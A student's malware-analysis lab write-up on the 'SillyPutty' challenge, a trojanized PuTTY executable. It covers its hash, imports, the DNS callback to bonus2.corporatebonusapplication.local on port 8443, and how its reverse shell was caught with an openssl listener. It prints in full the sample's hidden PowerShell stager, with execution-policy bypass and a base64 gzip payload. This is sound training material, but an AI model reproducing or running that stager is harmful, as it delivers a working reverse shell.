# Challenge 1: SillyPutty

# Challenge Questions:
**Basic Static Analysis**

1) What is the SHA256 hash of the sample?<br />
Ans: SHA256- 0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83 <br />

2) What architecture is this binary?<br />
Ans: Windows 32-bit binary is the architecture of the given sample. This can be viewed in PEstudio <br />
![](https://github.com/Niyanth-guru/Challenge-1-Silly-Putty-writeup/assets/58947833/a669f237-bf2c-4380-8dc0-0ea7a778dcb7)

3) Are there any results from submitting the SHA256 hash to VirusTotal?<br />
Ans: 59 vendors and 2 sandboxes have flagged this file as malicious.
![VirusTotal](https://github.com/Niyanth-guru/Challenge-1-Silly-Putty-writeup/assets/58947833/da65e615-edfd-4ed9-9ae2-008f69828145)

4) Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?<br />
Ans:  Powershell execution<br />

powershell.exe -nop -w hidden -noni -ep bypass "&(::create((New-Object System.IO.StreamReader(New-Object 
System.IO.Compression.GzipStream((New-Object 
System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yU
lypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7
TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk
25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUj
mWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFT
ope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRm
aKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+Fv
KJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcW
PiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WI
Gf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMod
e]::Decompress))).ReadToEnd()))"
GDI32.dll


5) Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?<br />
Ans: There were a lot of API calls that are used by threat actors to carry out their malicious activities. I’m mentioning some and the rest I will add in as a screenshot.
   - CreateWindowExA(USER32.dll)
   - FindWindowA(USER32.dll)
   - ShellExecuteA(SHELL32.dll)
![IAT](https://github.com/Niyanth-guru/Challenge-1-Silly-Putty-writeup/assets/58947833/a2fba0f5-7f60-4bcb-9239-52627e3ffff7)<br />

We see a lot of API calls that are frequently used by threat actors while developing malware. But on further studying I got to know that these API calls are also used by the putty software. So the IAT table did not give much info.


6) Is it likely that this binary is packed?<br />
Ans: No drastic change in the size of virtual data and size of Raw data. Implying that the binary may not be packed.
Also IAT listed out all the API calls taking place in the program thereby indicating that the program may not be packed.<br />
<br />

**Basic Dynamic Analysis**

1) Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?<br />
Ans: After initial detonation. The below observed output is without inetsim running the putty configuration dialog box appears and the powershell window appears and disappears.<br />
![initial_detontation](https://github.com/Niyanth-guru/Challenge-1-Silly-Putty-writeup/assets/58947833/9218e16c-ba1e-4cc0-844f-d72c4c752021)

2) From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?<br />
Ans: This powershell is executed at detonation which we got to know from static analysis(Refer the powershell script in Q4 of static analysis)
Now if we take the base64 string to REMnux and decode if and store the output to a file we get a compressed file<br />
![payload_finding](https://github.com/Niyanth-guru/Challenge-1-Silly-Putty-writeup/assets/58947833/e59e8583-4621-4301-a883-9beed38e221c)<br />

Extracting the file and opening it gave me the actual decompiled payload that was run during execution of the putty.exe program. We also find a lot of indicators in this file itself<br />
![payload](https://github.com/Niyanth-guru/Challenge-1-Silly-Putty-writeup/assets/58947833/9aefae4b-9273-4a4d-9e79-67032bf65f2d)

 3) What is the DNS record that is queried at detonation?<br />
Ans: The answer is provided in the following screenshot. This was captured using wireshark.<br />
![wireshark_dns_catcher](https://github.com/Niyanth-guru/Challenge-1-Silly-Putty-writeup/assets/58947833/6ad30dbb-91f5-459d-b0aa-f1d1fa9a5b92)<br />
DNS:-  bonus2.corporatebonusapplication.local

 4) What is the callback port number at detonation?<br />
Ans: At detonation the callback port is 8443.

5) What is the callback protocol at detonation?<br />
Ans: The callback protocol is TLS/SSL. This can be found via wireshark as the DNS resolves the packets that follow gives us details.

6) How can you use host-based telemetry to identify the DNS record, port, and protocol?<br />
Ans: I was not sure of how to do that. Please refer to the answers file in the repo 

7) Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?<br />
Ans: Since the FlareVM machine does not have the capability to acknowledge to the TLS Client Hello message. We might find it difficult to spawn a shell. Even in the walkthrough video for this challenge the instructor told we could set this up in kali and try spawning a shell. I tried and failed.
So when I was going through my course discord I found a procedure to spawn a shell which I will discuss below. First goto the etc\hosts file and point to the REMnux machine for the domain contacted by the binary.<br />
![etc-hosts](https://github.com/Niyanth-guru/Challenge-1-Silly-Putty-writeup/assets/58947833/ddbb5f97-9689-48dd-be7d-22e2cad766b7)

Then, on the REMnux box, you have to generate a self-signed SSL cert and private key.<br />
_openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes_ 

Then listen for the callback with openssl <br />
_openssl s_server -cert cert.pem -key key.pem -accept 8443_

Run the binary<br />
![run-binary](https://github.com/Niyanth-guru/Challenge-1-Silly-Putty-writeup/assets/58947833/a6c3c3f1-1784-47a2-acf7-65c2abb9f251)

Jump over to your REMnux box and you will see a shell spawned.
![reverse_shell](https://github.com/Niyanth-guru/Challenge-1-Silly-Putty-writeup/assets/58947833/543b4876-0ab7-482f-89a1-a9caef821f70)









